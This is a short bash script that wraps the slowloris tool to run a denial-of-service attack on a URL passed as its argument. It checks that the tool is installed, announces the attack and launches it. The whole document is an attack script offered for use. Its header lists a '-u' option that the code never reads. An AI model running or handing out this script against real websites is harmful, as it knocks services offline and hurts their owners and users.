#!/bin/bash
# Slowloris - Denial of Service Attack
# Options:
# -u : URL to target

# Usage: slowloris.sh <target_url>
# Example script
# slowloris.sh http://example.com

# Check if slowloris is installed
if ! command -v slowloris &> /dev/null
then
    echo "slowloris could not be found, please install it first."
    exit
fi

# Ensure URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1

echo "Starting Slowloris attack on $TARGET_URL"

# Perform Slowloris attack
slowloris $TARGET_URL

echo "Slowloris attack completed."
